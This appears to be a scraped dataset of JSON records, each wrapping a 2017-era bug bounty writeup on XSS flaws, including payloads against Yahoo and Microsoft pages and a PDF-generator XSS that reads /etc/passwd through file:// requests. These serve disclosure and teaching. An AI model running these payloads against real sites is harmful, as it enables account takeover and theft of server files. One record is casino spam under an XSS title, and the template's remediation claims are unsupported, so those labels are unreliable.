Comment... Email (Required) Name (Required) Website %d"}
{"source_url": "https://medium.com/@abdelfattahibrahim/from-recon-to-dom-based-xss-f279602a14cf", "title": "From Recon to DOM-Based XSS. I was doing some google dorking to find… | by Abdelfattah Ibrahim | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@abdelfattahibrahim/from-recon-to-dom-based-xss-f279602a14cf. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nFrom Recon to DOM-Based XSS. I was doing some google dorking to find… | by Abdelfattah Ibrahim | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in From Recon to DOM-Based XSS Abdelfattah Ibrahim 1 min read · Nov 11, 2017 -- 2 Listen Share I was doing some google dorking to find out if there’s any interesting files or parameters in the bug bounty program scope so i’ve tried alot of dorks and it was the turn of this one “ site:*.REDACTED.com inurl:file “ and then i found this endpoint : https://REDACTED.com/files/file.htm and there was some listed articles in the page so i navigated to an article and the url changed to be like this: https://REDACTED.com/files/file.htm#article 1.html after about 5 minutes i’ve figured out that any thing that you’ll put after “#” it will reflect in an IFRAME html tag so i tried to open an external domain: https://REDACTED.com/files/file.htm#http ://evil.com and guess what? Press enter or click to view image in full size and then tried to inject XSS payload “javascript:alert(1)” and it worked! https://REDACTED.com/files/file.htm#javascript :alert(1) I hope you guys like the writeup it’s pretty simple as you see regards, Abdelfattah. Security Bug Bounty Infosec Information Security Hacking -- -- 2 Written by Abdelfattah Ibrahim 122 followers · 9 following Responses ( 2 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@saamux/filter-bypass-to-reflected-xss-on-https-finance-yahoo-com-mobile-version-22b854327b27", "title": "Filter Bypass to Reflected XSS on https://finance.yahoo.com (mobile version) | by Samuel | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@saamux/filter-bypass-to-reflected-xss-on-https-finance-yahoo-com-mobile-version-22b854327b27. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nFilter Bypass to Reflected XSS on https://finance.yahoo.com (mobile version) | by Samuel | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Filter Bypass to Reflected XSS on https://finance.yahoo.com (mobile version) Samuel 3 min read · Sep 24, 2017 -- 2 Listen Share Today I‘ll share with you a interesting XSS in Yahoo. My favorite target is Yahoo, because they have a big scope, so let’s start. In the hunting process, I detected some websites that are responsive in a mobile way. Not always the vulnerabilities that are detected in a website are reflected in the mobile version. I tried to find any bug on the website https://finance.yahoo.com, but I didn’t find anything :(, so, I decided to find bugs in the mobile version of this website. Press enter or click to view image in full size Mobile Version Finance Yahoo Until I found a very interesting endpoint https://finance.yahoo.com/quote/xxxxxxxxyyyyzzzzzz Press enter or click to view image in full size In this endpoint, everything I wrote using the URL was reflected in the website, although through this, I could have done a Content Spoffing, I didn’t do it since this has no impact for Yahoo and it is also out scope, so my other option was to test an XSS, which I did with the next payload https://finance.yahoo.com/quote/ \"><svg onload=alert(1)> Press enter or click to view image in full size For my luck in the source code I realized that the characters “>< were processed, then I could execute an XSS, however I did not understand at first, why XSS did not work, being that the attack vector was correct. Well, then I understood, that I had to close the </script> tag so that the XSS would work. and then… Press enter or click to view image in full size Not running :( Well, I started to study the behavior of this XSS, and I realized that the payload was processed in capital letters, and well, I noticed that a payload in capital letters does not work. I just needed the word “alert” to be processed in lowercase. Then I came up with an HTML character encoding. Lowercase Coding alert Coding &#97;&#108;&#101;&#114;&#116; New Payload XSS https://finance.yahoo.com/quote/ \"></script><svg onload=%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B(document.domain)> Press enter or click to view image in full size : O: O: O and happiness came into my life :D. Thanks Twitter: @saamux Security Bug Bounty Hacking -- -- 2 Written by Samuel 616 followers · 10 following Responses ( 2 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://www.mohamedharon.com/2018/05/reflected-xss-in-hk-yahoo.html", "title": "Украинские казино онлайн – топовые игры быстрые выплаты и ежедневные бонусы", "friendly_explanation": "This is a bug bounty writeup from https://www.mohamedharon.com/2018/05/reflected-xss-in-hk-yahoo.html. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nУкраинские казино онлайн – топовые игры быстрые выплаты и ежедневные бонусы mohamedharon.com Меню Украинские казино онлайн Украинские казино онлайн Онлайн-казино в Украине становятся всё популярнее, и мы не можем не заметить, как быстро этот рынок развивается. С каждым годом появляется всё больше платформ, предлагающих захватывающие игры, щедрые бонусы и удобные способы оплаты. Это отличный способ провести время, испытать удачу и, возможно, сорвать крупный выигрыш. Мы понимаем, что выбор среди множества онлайн-казино может быть непростым. Ведь хочется, чтобы всё было честно, безопасно и увлекательно. Давайте разберёмся, как найти лучшее украинское казино онлайн, на что обратить внимание и какие возможности ждут нас в этом захватывающем мире азартных игр. Лучшие украинские казино онлайн Онлайн-казино в Украине предлагают игрокам широкий выбор качественных платформ. Мы рассмотрим популярные варианты и критерии, которые помогут найти надежное место для игры. Популярные платформы в 2025 году Украинские онлайн-казино уверенно выходят на международный рынок и становятся всё более популярными среди игроков в Эстонии. Они привлекают не только широким выбором игр, но и выгодными условиями для новичков: моментальная регистрация, щедрые приветственные бонусы, ежедневные акции и бесплатные фриспины. Parimatch Casino Быстрая регистрация через электронную почту или социальные сети. Фриспины начисляются после первого депозита. Казино предлагает ежедневные бонусы, кэшбэк и программу лояльности для активных игроков. Favbet Casino Упрощённый процесс создания аккаунта и регулярные турниры. Новые пользователи получают фриспины после подтверждения аккаунта. Бонусная система обновляется постоянно, предлагая свежие акции и розыгрыши. Cosmolot Casino Регистрация занимает менее минуты. Платформа предлагает ежедневные фриспины, бонусы за активность, кэшбэк и адаптивный мобильный интерфейс. Программа лояльности настраивается под индивидуальный стиль игры. Slotoking Casino Бездепозитные фриспины сразу после регистрации и быстрый старт. Казино предлагает регулярные акции, обновление игровых автоматов и оперативное выведение выигрышей — именно это ценят игроки в Эстонии. First Casino Бесплатные фриспины доступны уже на этапе регистрации или первого входа. Казино проводит ежедневные промо, турниры и предоставляет интуитивно понятный интерфейс, особенно удобный для новичков. Мы видим, что у операторов увеличивается акцент на мобильные приложения. Это делает игры доступными в любое время. Среди популярных слотов пользователи чаще выбирают Book of Ra от Novomatic и Mega Moolah от Microgaming. Критерии выбора надежного казино Чтобы обеспечить безопасность и прозрачность игры, нужно учитывать несколько ключевых параметров: Лицензия. Надежные площадки, такие как упомянутые выше, обычно имеют лицензии КРАИЛ или международные, например, от Malta Gaming Authority. Методы оплаты. Важны варианты пополнения и вывода средств, включая банковские карты, электронные кошельки и криптовалюты. Бонусы и акции. Платформы предлагают приветственные бонусы, фриспины и программы лояльности, привлекая новых игроков. Отзывы и репутация. Реальные отзывы помогают оценить качество сервиса. Техподдержка. Круглосуточная поддержка делает игру комфортной и безопасной. При выборе платформы стоит проверить каждый критерий, чтобы получить максимально позитивный опыт. Особенности украинских казино онлайн Украинские казино онлайн привлекают игроков благодаря разнообразию игр, гибким бонусным предложениям и прозрачному регулированию. Рассмотрим ключевые аспекты работы этих платформ. Законодательство и регулирование Украинское правительство активно регулирует рынок онлайн-гемблинга. С 2020 года казино обязаны получать лицензию Комиссии по регулированию азартных игр и лотерей (КРАИЛ). Лицензия подтверждает, что платформа соблюдает закон, использует сертифицированные игры и обеспечивает защиту данных игроков. Например, такие известные казино как Cosmolot и Parimatch успешно прошли лицензирование, гарантируя честность и прозрачность. Разнообразие игр Украинские казино отличаются широким выбором развлечений. Игровые автоматы занимают лидирующую позицию, предлагая тысячи вариантов с разными тематиками. В дополнение к слотам популярны рулетка, блэкджек, баккара и покер. Live-игры с реальными дилерами, представленные на платформах вроде Parimatch, создают атмосферу настоящего казино. Также отмечаем наличие джекпотов и турниров, стимулирующих азарт. Бонусы и акции Большинство украинских казино предоставляют привлекательные бонусы. Новички получают приветственные пакеты, такие как депозитные бонусы до 150% и бесплатные вращения на слотах. Постоянные игроки участвуют в программах лояльности, еженедельных акциях и турнирах. Cosmolot, например, известен ежедневными бонусами, а Slotoking продвигает систему кэшбэка. Эти предложения увеличивают шансы на выигрыш и повышают интерес пользователей. Методы платежей в украинских казино онлайн Онлайн-казино в Украине предлагают широкий выбор методов оплаты, чтобы удовлетворить запросы пользователей. Рассмотрим самые популярные варианты и их особенности. Популярные способы депозитов и выводов Мы отмечаем, что самые востребованные методы оплаты включают банковские карты Visa и Mastercard, которые обеспечивают надежность и быстроту транзакций. Также популярны электронные кошельки, такие как Monobank, Приват24 и Qiwi, благодаря удобству и моментальному зачислению средств. Множество казино поддерживают криптовалютные платежи (Bitcoin, Ethereum), что обеспечивает анонимность и высокую безопасность операций. Некоторые платформы предлагают прямые переводы через мобильных операторов, таких как Киевстар и Vodafone, что делает процесс особенно доступным для пользователей без банковских карт. Комиссии и скорость транзакций Размер комиссии зависит от выбранного метода. Обычно операции через банковские карты или электронные кошельки проходят без лишних сборов, тогда как криптовалютные переводы нередко включают сетевые комиссии. Мобильные платежи иногда сопровождаются небольшими дополнительными затратами со стороны оператора. Скорость обработки транзакций особенно важна для игроков. Депозиты через карты и электронные кошельки зачисляются мгновенно, тогда как вывод средств обычно занимает от 1 до 3 рабочих дней. Криптовалютные операции проходят быстрее, среднее время обработки редко превышает несколько часов. Преимущества и недостатки игр в украинских казино онлайн Украинские онлайн-казино предлагают множество игровых возможностей, но важно понимать как их преимущества, так и возможные ограничения. Рассмотрим обе стороны. Основные преимущества Доступность и удобство. Играть можно в любое время и из любого места, будь то смартфон, планшет или компьютер. Многие казино имеют мобильные приложения с адаптивным интерфейсом. Широкий выбор игр. Украинские платформы предлагают сотни слотов, настольных игр, рулеток и live-дилеров. Примеры популярных игр включают «Книга Ра», европейскую рулетку и блэкджек. Бонусные программы. Новые игроки получают приветственные бонусы, а постоянные — кэшбек, фриспины и регулярные акции. Такие игры, как в Cosmolot и Parimatch, часто сопровождаются ежедневными или персонализированными наградами. Безопасность транзакций. Лицензионные казино применяют шифрование данных и предлагают защищённые методы платежей, включая Visa, Приват24 и криптовалюты, что гарантирует безопасность финансовых операций. Правовая защита. С лицензией от КРАИЛ игроки защищены юридически, их данные хранятся в соответствии с украинскими законами. Возможные риски и ограничения Игровая зависимость. Некоторые пользователи могут столкнуться с аддикцией. Надёжные казино предлагают функцию самоисключения или лимитов для контроля. Финансовые потери. Азартные игры не гарантируют доход; ставки связаны с риском потерь. Ограничения доступа. Платформы с лицензией КРАИЛ доступны только пользователям из Украины, а иностранные казино могут быть заблокированы. Скорость вывода средств. В зависимости от метода платежей, процесс может занимать до 3 рабочих дней, что требует планирования. Блокировки и технические проблемы. Иногда из-за сбоев или интернет-ограничений доступ к платформам может быть временно недоступен. Мы всегда рекомендуем взвешивать преимущества и риски, чтобы делать ставки осознанно и получать только позитивные эмоции. Советы для новичков Новые игроки часто сталкиваются с трудностями из-за отсутствия опыта. Давайте разберёмся, как сделать старт в украинских онлайн-казино комфортным и безопасным. Как начать игру без ошибок Выбор лицензированного казино. Играть стоит только на платформах с лицензией КРАИЛ. Это гарантирует защиту данных и честные выплаты. Регистрация с корректными данными. Указываем только реальные данные: имя, дату рождения и контактную информацию, чтобы избежать проблем с выводом средств. Изучение правил игры. Читаем правила каждого автомата или стола, особенно перед ставками на реальные деньги. Это помогает понимать механику и избегать неоправданных потерь. Определение бюджета. Устанавливаем дневной или недельный лимит на ставки. Это предотвратит финансовые риски и сохранит положительные эмоции. Проверка отзывов. Читаем мнения пользователей об условиях вывода средств, поддержке и игровых автоматах. Частые ошибки игроков Игнорирование лицензии. Некоторые новички выбирают незарегистрированные казино из-за бонусов, что может привести к потере средств. Пренебрежение акциями. Игроки не используют приветственные бонусы или программы лояльности, хотя они увеличивают шансы на выигрыш. Отсутствие стратегии. Делать ставки хаотично — одна из типичных ошибок. Лучше придерживаться стратегии и применять аналитику. Эмоциональные решения. Азарт часто мешает вовремя остановиться, что ведёт к превышению бюджета. Неправильный выбор игр. Игры без понимания коэффициентов выигрыша (RTP) могут принести меньше удовольствия и больше потерь. Итог Украинские онлайн-казино продолжают радовать нас своим разнообразием, удобством и безопасностью. Благодаря лицензированию, современным технологиям и широкому выбору игр, каждый игрок может найти платформу, которая идеально соответствует его предпочтениям. Мы уверены, что осознанный подход к выбору казино и соблюдение простых рекомендаций помогут вам наслаждаться игрой, избегая неприятных ситуаций. Не забывайте об ответственности и играйте для удовольствия, а не ради риска. Пусть ваш опыт в украинских онлайн-казино будет захватывающим, а удача всегда на вашей стороне! Часто задаваемые вопросы Какие критерии важны при выборе онлайн-казино в Украине? Для выбора надежного онлайн-казино обратите внимание на наличие лицензии, разнообразие игр, методы оплаты, бонусные программы, репутацию и отзывчивость технической поддержки. Проверка этих параметров гарантирует честность, безопасность и комфортный игровой опыт. Какие казино популярны в Украине в 2023 году? Особой популярностью пользуются Cosmolot, Parimatch, JacobCasino и Slotoking. Эти платформы предлагают широкий выбор игр, бонусы и удобный пользовательский интерфейс. Какие способы оплаты доступны в украинских онлайн-казино? Часто используются Visa, Mastercard, Monobank, Приват24, Qiwi, криптовалюты (Bitcoin, Ethereum) и мобильные платежи. Время зачисления депозита обычно мгновенное, а вывод средств может занять от 1 до 3 рабочих дней. Насколько безопасны игры в онлайн-казино? Безопасность обеспечивается лицензированием, шифрованием данных и честными системами генерации случайных чисел. Игрокам рекомендуется выбирать только лицензированные платформы. Какие бонусы можно получить в украинских онлайн-казино? Бонусы включают приветственные пакеты, бесплатные вращения, кешбэк и программы лояльности. Эти акционные предложения увеличивают шансы на выигрыш. Какие риски связаны с игрой в онлайн-казино? Основные риски — это финансовые потери, игровая зависимость и технические проблемы. Для минимизации рисков важно играть осознанно и придерживаться установленного бюджета. Можно ли играть в украинских казино на мобильных устройствах? Да, большинство онлайн-казино предлагают мобильные приложения или адаптированные версии сайта, что позволяет играть в любое время и в любом месте. Как быстро проходят финансовые транзакции в казино? Депозиты обычно зачисляются мгновенно, а вывод средств может занимать от нескольких часов до 3 рабочих дней в зависимости от метода платежа. Как проверить легальность онлайн-казино в Украине? Убедитесь, что казино имеет лицензию от КРАИЛ (Комиссии по регулированию азартных игр и лотерей). Информация о лицензии должна быть указана на официальном сайте казино. Какие ошибки новички допускают при игре в онлайн-казино? Частые ошибки — игнорирование лицензии, ставка больше установленного бюджета, отсутствие стратегии и эмоциональные решения. Избегайте этих ошибок для улучшения игрового опыта. Copyright © 2025 - all rights reserved by mohamedharon.com Прокрутка вверх"}
{"source_url": "http://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html", "title": "Local File Read via XSS in Dynamically Generated PDF", "friendly_explanation": "This is a bug bounty writeup from http://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nLocal File Read via XSS in Dynamically Generated PDF Skip to main content Search Search This Blog Noob Ninja! - Infosec Writeups Share Get link Facebook X Pinterest Email Other Apps November 08, 2017 Local File Read via XSS in Dynamically Generated PDF REDIRECTING TO THE NEW BLOG ... Hello Hunters, This time I am writing about a Vulnerability found in another private program(xyz.com) on Bugcrowd which at first I thought wasn't much harmful(P4) but later escalated it to a P1. While browsing the Application I came across an endpoint which allowed us to download some kind of Payment Statements as PDF. The URL looked like this https://xyz.com/payments/downloadStatements?Id=b9bc3d&utrnumber=xyz&date=2017-08-11&settlement_type=all&advice_id=undefined I saw that the Value of utr number is reflected inside the PDF file that got downloaded so I wrote some HTML in utrnumber parameter as \"><S>aaa https://xyz.com/payments/downloadStatements?Id=b9bc3d& utrnumber = \"><S>aaa &date=2017-08-11&settlement_type=all&advice_id=undefined Upon opening this PDF I found that the HTML was rendered and could be seen in PDF. This kind of vulnerability usually leads to XSS but this time it was inside a PDF which was being generated dynamically. If you want to learn more about XSS then I advise to checkout this great intro on XSS: https://www.aptive.co.uk/blog/xss-cross-site-scripting/ I tried if I could use an iframe and load internal domains in the frame or if I could iframe file:///etc/passwd but none of the tricks worked! also, I wasn't able to iframe external domains. https://xyz.com/payments/downloadStatements?Id=b9bc3d& utrnumber = \"><iframe src=\"http://localhost\"></iframe> &date=2017-08-11&settlement_type=all&advice_id=undefined But, from now I didn't know if I could go further because I wasn't sure if javascript could be executed like this in PDF.So after playing around a lot I found that we could execute javascript with the help of DOM Manipulation <p id=\"test\">aa</p><script>document.getElementById('test').innerHTML+='aa'</script> https://xyz.com/payments/downloadStatements?Id=b9bc3d& utrnumber = <p id=\"test\">aa</p><script>document.getElementById('test').innerHTML+='aa'</script> &date=2017-08-11&settlement_type=all&advice_id=undefined and Upon downloading PDF I found that it contained the \"aaaa\" :D also sometime later, I found that I could also use document.write() function to show results more easily. <img src=x onerror=document.write('aaaa')> https://xyz.com/payments/downloadStatements?Id=b9bc3d& utrnumber = <img src=x onerror=document.write('aaaa')> &date=2017-08-11&settlement_type=all&advice_id=undefined after this I checked the window.location of where this javascript is executed and to my surprise it was executing in file:// origin on the Server https://xyz.com/payments/downloadStatements?Id=b9bc3d& utrnumber = <img src=x onerror=document.write('aaaa'%2bwindow.location)> &date=2017-08-11&settlement_type=all&advice_id=undefined Now since its executing on file://, I tried if we could access file:///etc/passwd via XHR(XMLHttpRequest), I wasn't sure myself. <script> x=new XMLHttpRequest; x.onload=function(){ document.write(this.responseText) }; x.open(\"GET\",\"file:///etc/passwd\"); x.send(); </script> https://xyz.com/payments/downloadStatements?Id=b9bc3d&utrnumber= <script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open(\"GET\",\"file:///etc/passwd\");x.send();</script> &date=2017-08-11&settlement_type=all&advice_id=undefined and then you know ;) so That was it, XSS in Server Side Generated PDFs to Local File Read! However, it took :P me some time to figure this You could see the number of PDFs I had to download: ./peace Rahul Maini Share Get link Facebook X Pinterest Email Other Apps Comments Unknown 8 November 2017 at 04:32 bhai kaise <3 Reply Delete Replies Reply Aryan Rupala 8 November 2017 at 08:40 Great Find! Reply Delete Replies Reply intx0x80 8 November 2017 at 12:40 Nice shot Reply Delete Replies Reply muthu 9 November 2017 at 01:42 Nice Bro.. :) Reply Delete Replies Reply Harsh Jaiswal 14 November 2017 at 04:47 Very nice Bro :) Reply Delete Replies Reply Rohan 15 November 2017 at 04:26 Nicely done! Reply Delete Replies Reply Unknown 29 November 2017 at 09:14 Nice, I use this today in an engagement. Awesome finding Reply Delete Replies Unknown 29 November 2017 at 09:15 Does this lead to probably ssrf too? Delete Replies Reply Rahul Maini 29 November 2017 at 10:48 Thanks :) Actually yea it leads to a SSRF but since it was executing under file:/// , and I don't may be thats why I wasn't able to load/iframe any of the http:// origin but should work in other cases like you might check this awesome blogpost by @bbuerhaus https://buer.haus/2017/06/29/escalating-xss-in-phantomjs-image-rendering-to-ssrflocal-file-read/ Delete Replies Reply Unknown 16 January 2018 at 01:08 hi i found same case and there is ssrf and server downloads file from my http server. But problem is that i am not able to exploit LFI Delete Replies Reply Reply Unknown 18 March 2018 at 02:29 need ur help can i contact u Reply Delete Replies Reply dghdh 2 May 2018 at 08:15 Great find! Reply Delete Replies Reply Sadiq West 20 January 2019 at 23:56 Great finding Reply Delete Replies Reply Nino Nurmadi , S.Kom 25 June 2019 at 04:05 Sharp Advan Metro Lampung Panasonic pulsa lampung Lampung Lampung Reply Delete Replies Reply All Information 29 September 2019 at 21:39 Nice article airtel recharge list Reply Delete Replies Reply Brandon William 22 January 2020 at 10:58 The person merely uploads the picture that they need transformed and the net picture converter renders the picture and makes it accessible for obtain. Like all picture vectorizer applications, they range in high quality, pace, options and price. If you want to learn more about this topic please visit onlineconvertfree.com Reply Delete Replies Reply Unknown 3 June 2020 at 21:39 here from HTB, thanks a lot! Reply Delete Replies Reply egyption 5 June 2020 at 13:55 i need the pdf file Reply Delete Replies Reply Skofos 11 July 2020 at 01:17 This comment has been removed by the author. Reply Delete Replies Reply bugbountyhuntingonline 14 October 2020 at 01:15 j.aadithya techusa is #1: vapt services in usa https://www.algotradeusa.com/ Reply Delete Replies Reply Lorriel Sims 1 February 2021 at 07:52 Cross-site scripting attacks, often abbreviated as XSS, are a type of attack in http://casitabuilderlasvegas.com/ Reply Delete Replies Reply Huongkv 28 February 2021 at 23:06 Đặt vé máy bay tại đại lý Aivivu, tham khảo Ve may bay di My mua vé máy bay từ mỹ về vn giá vé máy bay đà nẵng đi nha trang bảng giá vé máy bay đi phú quốc vé máy bay đi Huế pacific airline Reply Delete Replies Reply technology 22 March 2021 at 05:55 A self-hosted WordPress site gives you the opportunity to earn more and become a successful Internet marketer. Take the first step today by getting a beginner WordPress course. best course to learn R programming Reply Delete Replies Reply Add comment Load more... Post a Comment Popular Posts July 21, 2019 Exploiting a Tricky Blind SQL Injection inside LIMIT clause Share Get link Facebook X Pinterest Email Other Apps 3 comments Powered by Blogger Theme images by Matt Vince Rahul Maini Application Security Engineer and a Bug Bounty Hunter currently active on Bugcrowd. Interested in learning Binary Exploitation and Reverse Engineering! Follow me @iamnoooob Visit profile Archive December 2019 1 July 2019 1 July 2018 1 November 2017 1 September 2017 1 Report Abuse"}
{"source_url": "https://medium.com/@adeshkolte/non-persistent-xss-at-microsoft-adesh-kolte-ad36b1b4a325", "title": "Non-persistent XSS at Microsoft -Adesh Kolte | by Adesh Kolte | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@adeshkolte/non-persistent-xss-at-microsoft-adesh-kolte-ad36b1b4a325. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nNon-persistent XSS at Microsoft -Adesh Kolte | by Adesh Kolte | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Non-persistent XSS at Microsoft -Adesh Kolte Adesh Kolte 2 min read · Nov 5, 2017 -- Listen Share logo Hello Guyzz I am Adesh Nandkishor Kolte (An Independent Security Resercher From India) I had found a reflected XSS issue Microsoft, below is the My Writeup. Vulnerability Type: Non Persistent XSS Abstract: The affected url is vulnerable to Non-persistent XSS due to which an attacker is able to take over Microsoft account of logged in user. Affected Url: https://www.microsoft.com/en-us/research/search/?q=<script>prompt();<script> Payload: <script>prompt();</script> Vulnerability Impact Senario: With Non Persistent Cross Site Scripting(XSS) an attacker can create custom URL with cookie stealing code on visiting which a user’s cookie can be stolen and his account can be hijacked. Vulnerability Reproduction Steps(POC): 1. Visit the URL “https://www.microsoft.com/en-us/research/search/?q=\" 2. With the parameter “q=” we can inject our payload. Brief description of the issue: This vulnerability is caused due to validation present only on the Search textbox present on the webpage. And no validation is present if we provide the same malicious HTML payload directly through the URL. Proof of Concept: Xss by Ak Hall Of Fame: Press enter or click to view image in full size Listed in Microsoft Security Resercher Aknowledgment Hall Of Fame Link: https://technet.microsoft.com/en-us/security/cc308575#0420 Thanks For Reading :) Security -- -- Written by Adesh Kolte 647 followers · 143 following Listed in Top 100 most respected hackers in the world by Microsoft at the BlackHat conference in America 2018 No responses yet Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@arbazhussain/stored-xss-with-arbitrary-cookie-installation-567931433c7f", "title": "[Stored XSS] with arbitrary cookie installation | by Arbaz Hussain | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@arbazhussain/stored-xss-with-arbitrary-cookie-installation-567931433c7f. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\n[Stored XSS] with arbitrary cookie installation | by Arbaz Hussain | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in [Stored XSS] with arbitrary cookie installation Arbaz Hussain 1 min read · Sep 17, 2017 -- 1 Listen Share Severity : Medium Complexity : Easy Weakness : Trusting the cookies values without sanitizing malicious input. While Testing one of the Hackerone Program , the value of the Parameter refclickid from url was getting stored in response cookie’s. https://redacted.com/mobile-app/?refclickid=xxxxxxxxxxxxxx Press enter or click to view image in full size Here problem was the value of refclickid is getting stored in Set- Cookie:Referral=CLICKID=XXXXXX And Application was storing the same Reference Click ID taking from cookie value to Response of the Body in JSON format under <SCRIPT> TAG’s without any sanitizing user input on each and every page. Attack Scenario : Attacker Send’s Victim Following URL to Set Refclickid value as XSS Payload in the cookies. https://redacted.com/mobile-app/?refclickid=%3C%2FScRipt%3E%3CScRipt%3Eprompt(document.domain)%3B%2F%2F. 2. Set-Cookie Value has been Saved with XSS Payload . 3. When Victim Visit’s https://redacted.com/ or Any Page Under Redacted.com without any parameter XSS is Fired because Response of the Body Takes the Value of Stored Cookie and Saves them under <script> Tag’s. JavaScript Bug Bounty Xss Attack -- -- 1 Written by Arbaz Hussain 2K followers · 411 following Security Analyst Responses ( 1 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://www.ansariosama.com/2017/11/how-i-pwned-company-using-idor-blind-xss.html", "title": "How I Pwned a company using IDOR & Blind XSS", "friendly_explanation": "This is a bug bounty writeup from https://www.ansariosama.com/2017/11/how-i-pwned-company-using-idor-blind-xss.html. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nHow I Pwned a company using IDOR & Blind XSS Skip to main content My Blog Search Search This Blog How I Pwned a company using IDOR & Blind XSS November 15, 2017 This post is about exploiting Blind XSS and IDOR to gain access to company's Slack, Facebook Workplace and other services used by the company. Special Thanks to Inti De Ceukelaire without his disclosure this would not have been possible. And also thanks to my friend Harsh Jaiswal for giving some ideas. Most of the people from infosec community must have read the disclosure by Inti De Ceukelaire regarding Ticket Trick , if you have not read I would suggest reading that first. ( https://medium.freecodecamp.org/how-i-hacked-hundreds-of-companies-through-their-helpdesk-b7680ddc2d4c ) After reading the article, first thing came to my mind was exploiting this on a company as it had similar functionality on Support Tickets. The company's website had a Support Portal. We could create a Ticket by sending an email. Exploiting Ticket Trick to gain access to company's Slack or Facebook Workplace was not possible as Slack and Facebook included a random token while sending verification or forgot password emails. But there was a Blind XSS in company's internal domain from where they managed the tickets and an IDOR to View any user's ticket using both the vulnerabilities, I was able to access the company's Slack, Facebook Workplace. IDOR to View Any Support Ticket: There was a GET request in the Mobile application which allowed to view support tickets of any user by changing the Ticket ID. GET /api/param?param=XXXXXXXXXXXXXXXXXXXXX HTTP/1.1 Host: company.com Connection: close Accept: application/json, text/javascript X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 Accept-Language: en-IN,en-US;q=0.8 Cookie: x The Ticket ID, however, included 12-13 random numbers, so bruteforcing it would have taken a lot of time. So we still needed to find the Ticket ID. The IDOR was reported 1 month back was not fixed :P Blind XSS: We could create a support ticket by sending an email to support@company.com. The company then manages the Tickets from an internal domain. The input fields sent from the email was not sanitized on their internal domain. I created a ticket by sending an email with XSS payload. When the ticket was viewed by support staff XSS was triggered on their internal domain. I had used XSS Hunter to test this Blind XSS, XSS Hunter also captures the DOM of the entire page where the XSS is executed. The DOM contained all recently created Ticket IDs. The Blind XSS was also reported a month back and was marked as Not Applicable as the domain where XSS was executed was an internal domain and not mentioned in the scope. Chaining both the issues: I sent a password reset link to support@company.com at https://company.slack.com/forgot. This resulted in the creation of a ticket by no-reply-randomtoken@slack.com. Immediately after sending the password reset link to Slack, I sent an email to support@company.com with Blind XSS Payload. After some time the Blind XSS was executed, I received the DOM of the page. The DOM contained Ticket ID of the email sent from no-reply-randomtoken@slack.com. Using the IDOR, I was able to View the Ticket which surprisingly contained registration links of 8 Slack Channels of the Company. Similarly, Company's Facebook Workplace could have been accessed. This was also marked Not Applicable by the company but was rewarded with the company's minimum bounty amount. Share Get link Facebook X Pinterest Email Other Apps Labels POC Labels: POC Share Get link Facebook X Pinterest Email Other Apps Comments nullptr 28 December 2017 at 20:26 Salaam Bhai. Really amazing hack !Motivates me much Reply Delete Replies Reply Hx01 9 April 2018 at 12:14 Great Find! Reply Delete Replies Reply Chirag Gupta 9 January 2019 at 08:29 Awesome Reply Delete Replies Reply Add comment Load more... Post a Comment Popular posts from this blog Exploiting a Single Request for Multiple Vulnerabilities September 19, 2017 Hello Everyone, This is my first blog post, it's about multiple security vulnerabilities found from a single request on a private program recently. The vulnerabilities found are simple Stored and Reflected XSS, SSRF and Command Injection. But since I have never written any pocs before, so just wanted to write about this one. So let's call the website as privatesite.com After login, the first thing I saw was a feature to upload images. So started testing the uploader functionality, like directly uploading PHP, SWF, SVG, etc., but nothing worked as the uploader looked secured from my end. Then I noticed there is a feature to crop the image, the post request of this feature looked kind of interesting. 1. SSRF There was a parameter http_path which had the image URL, so I fired up a socket listening to a port on my server, and in that http_path parameter I put my server's IP and port, and the socket received the connection. So an external SSRF was c... Share Get link Facebook X Pinterest Email Other Apps 5 comments Read more About Me Osama Ansari Visit profile Archive 2017 2 November 1 How I Pwned a company using IDOR & Blind XSS September 1 Labels POC Report Abuse Powered by Blogger"}
{"source_url": "http://www.noob.ninja/2017/09/story-of-parameter-specific-xss.html", "title": "Story of a Parameter Specific XSS!", "friendly_explanation": "This is a bug bounty writeup from http://www.noob.ninja/2017/09/story-of-parameter-specific-xss.html. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nStory of a Parameter Specific XSS! Skip to main content Search Search This Blog Noob Ninja! - Infosec Writeups Share Get link Facebook X Pinterest Email Other Apps September 19, 2017 Story of a Parameter Specific XSS! REDIRECTING TO THE NEW BLOG ... Hello Infosec folks! So I am going to start writing posts related to my bug hunting findings and share it with the community starting with this post. So, this post is about a Reflected XSS I found in a Private Program which has been previously tested many times.This XSS was present on nearly every page of the domain (let's call this private-bounty.com) but wasn't found by anyone before. When I was going through the Application, I found an endpoint which had following in URL: https://www.private-bounty.com/Deactivate?view= aaa &utm_content= foo &utm_medium= bar &utm_source= baz I checked the source code to see if the parameter \"view\" was reflected somewhere in the page and it was found that the whole URL was reflected in Javascript context(inside Script tags) but except for the parameter \"view\" and its value. It got reflected as - https://www.private-bounty.com/Deactivate?utm_content= foo &utm_medium= bar 